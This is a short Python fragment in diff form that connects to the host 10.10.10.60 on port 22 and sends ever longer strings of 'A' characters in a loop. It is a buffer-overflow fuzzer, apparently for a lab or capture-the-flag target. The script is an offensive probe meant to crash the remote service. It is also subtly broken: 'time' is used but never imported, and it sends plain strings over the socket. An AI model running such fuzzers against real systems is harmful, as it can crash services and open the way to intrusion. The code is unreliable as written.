import socket
+
+s = socket.socket()
+s.connect(("10.10.10.60",22))
+
+for i in range(0,30000):
+	s.send("A" * i)
+	time.sleep(10)
+	print("Sent buffer of " + str(i) + " A's")

